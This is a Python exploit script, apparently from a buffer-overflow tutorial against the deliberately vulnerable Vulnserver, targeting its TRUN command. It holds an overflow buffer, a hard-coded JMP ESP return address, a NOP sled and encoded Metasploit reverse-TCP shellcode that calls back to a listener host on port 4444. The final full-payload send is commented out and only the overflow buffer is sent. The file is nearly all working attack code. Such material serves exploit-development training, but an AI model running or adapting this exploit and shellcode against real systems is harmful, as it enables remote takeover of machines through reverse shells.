
#!/usr/bin/python

"""
Script from Article:
https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
"""

import socket

buff = "TRUN /.:/"
buff += "A" * 2003

#JMP ESP address, from find /b, little endian
EIP = '\xA0\x12\x50\x62'

# 0x625012a0

# NOP sled
nop = '\x90' * 20

# windows/shell_reverse_tcp - 351 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=10.50.30.147, LPORT=4444, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, 
# AutoVerifySession=true
buf =  b""
buf += b"\xda\xc3\xd9\x74\x24\xf4\x58\xbb\xa7\xda\xb0\x84"
buf += b"\x33\xc9\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x4f"
buf += b"\x26\x52\x71\x73\x3f\x11\x7a\x8b\xc0\x76\xf2\x6e"
buf += b"\xf1\xb6\x60\xfb\xa2\x06\xe2\xa9\x4e\xec\xa6\x59"
buf += b"\xc4\x80\x6e\x6e\x6d\x2e\x49\x41\x6e\x03\xa9\xc0"
buf += b"\xec\x5e\xfe\x22\xcc\x90\xf3\x23\x09\xcc\xfe\x71"
buf += b"\xc2\x9a\xad\x65\x67\xd6\x6d\x0e\x3b\xf6\xf5\xf3"
buf += b"\x8c\xf9\xd4\xa2\x87\xa3\xf6\x45\x4b\xd8\xbe\x5d"
buf += b"\x88\xe5\x09\xd6\x7a\x91\x8b\x3e\xb3\x5a\x27\x7f"
buf += b"\x7b\xa9\x39\xb8\xbc\x52\x4c\xb0\xbe\xef\x57\x07"
buf += b"\xbc\x2b\xdd\x93\x66\xbf\x45\x7f\x96\x6c\x13\xf4"
buf += b"\x94\xd9\x57\x52\xb9\xdc\xb4\xe9\xc5\x55\x3b\x3d"
buf += b"\x4c\x2d\x18\x99\x14\xf5\x01\xb8\xf0\x58\x3d\xda"
buf += b"\x5a\x04\x9b\x91\x77\x51\x96\xf8\x1f\x96\x9b\x02"
buf += b"\xe0\xb0\xac\x71\xd2\x1f\x07\x1d\x5e\xd7\x81\xda"
buf += b"\xa1\xc2\x76\x74\x5c\xed\x86\x5d\x9b\xb9\xd6\xf5"
buf += b"\x0a\xc2\xbc\x05\xb2\x17\x12\x55\x1c\xc8\xd3\x05"
buf += b"\xdc\xb8\xbb\x4f\xd3\xe7\xdc\x70\x39\x80\x77\x8b"
buf += b"\xaa\xa5\xb5\x8d\xb9\xd2\xbb\xb1\xac\x7e\x35\x57"
buf += b"\xa4\x6e\x13\xc0\x51\x16\x3e\x9a\xc0\xd7\x94\xe7"
buf += b"\xc3\x5c\x1b\x18\x8d\x94\x56\x0a\x7a\x55\x2d\x70"
buf += b"\x2d\x6a\x9b\x1c\xb1\xf9\x40\xdc\xbc\xe1\xde\x8b"
buf += b"\xe9\xd4\x16\x59\x04\x4e\x81\x7f\xd5\x16\xea\x3b"
buf += b"\x02\xeb\xf5\xc2\xc7\x57\xd2\xd4\x11\x57\x5e\x80"
buf += b"\xcd\x0e\x08\x7e\xa8\xf8\xfa\x28\x62\x56\x55\xbc"
buf += b"\xf3\x94\x66\xba\xfb\xf0\x10\x22\x4d\xad\x64\x5d"
buf += b"\x62\x39\x61\x26\x9e\xd9\x8e\xfd\x1a\xe9\xc4\x5f"
buf += b"\x0a\x62\x81\x0a\x0e\xef\x32\xe1\x4d\x16\xb1\x03"
buf += b"\x2e\xed\xa9\x66\x2b\xa9\x6d\x9b\x41\xa2\x1b\x9b"
buf += b"\xf6\xc3\x09"

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

s.connect(("10.50.27.126", 9999))

print (s.recv(1024))
# s.send(buff + EIP + nop + buf)
s.send(buff)

print (s.recv(1024))

s.close()
